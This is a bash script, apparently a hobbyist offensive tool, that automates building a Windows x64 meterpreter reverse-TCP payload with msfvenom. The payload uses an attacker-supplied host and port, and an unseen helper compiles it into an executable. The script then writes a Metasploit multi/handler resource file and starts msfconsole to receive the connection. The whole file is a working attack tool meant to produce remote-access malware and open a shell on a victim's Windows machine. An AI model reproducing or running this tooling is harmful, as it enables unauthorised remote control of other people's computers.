#!/usr/bin/env bash
# Coded By : Djawad-Hammadi
# Github : Djawad-Hammadi
# Date : 24/01/2022
# Let's Start This Shit 
banner(){
if [[ -e handler.rc ]];then
rm -rf handler.rc
fi
printf "
\033[0;31m                Look At Me I'm Roning (:
\033[1;33m         />_________________________________
\033[1;33m[########[]_________________________________>
\033[1;33m         \>
\033[0;34m        [---] Coded By : \033[0;31mDjawed Hammadi \033[0;34m(\033[1;33mx-line\033[0;34m) [---]
\033[0;34m          [---] Follow me on Twitter: \033[0;35m@xlinex23 \033[0;34m[---]                
"
}
main(){
python3=`which python3` 
if [[ "$?" == "0" ]];then
sleep 2 
printf ""
else 
printf "\n\033[0;32m[#]\033[1;37m Python3 Not Found In Your System (;\n\n"
printf "\033[1;33mInstalling It :\n"
apt-get install python3 -y 
printf "\n\033[0;32mDone..\n\n"
fi
mingw=`which x86_64-w64-mingw32-g++`
if [[ "$?" == "0" ]];then
sleep 2 
printf ""
else 
printf "\n\033[0;32m[#]\033[1;37m mingw32 Not Found In Your System (;\n\n"
printf "\033[1;33mInstalling It :\n"
apt-get install g++ -y 
printf "\n\033[0;32mDone..\n\n"
fi
sleep 5 
clear
banner
printf "\n\033[0;32mEnter Host : " ;read host
printf "\n\033[0;32mEnter Port : " ;read port
sleep 5 
msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=$host lport=$port -f raw -o she3ll.bin > /dev/null 2>&1
printf "\n\033[1;37mPayload Generated"
python3 help.py she3ll.bin > /dev/null 2>&1
printf "\n\n\033[1;30ma.exe \033[0;31mGenerated And Compiled Successfully In Outptut Folder"
printf "\n\n\033[1;33mCreate Multi Handler Session For you ! \n\n"
if [[ -e she3ll.bin ]];then
rm -rf she3ll.bin
fi
echo "
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST $host
set LPORT $port
exploit
" > handler.rc
msfconsole -r handler.rc
}
main


      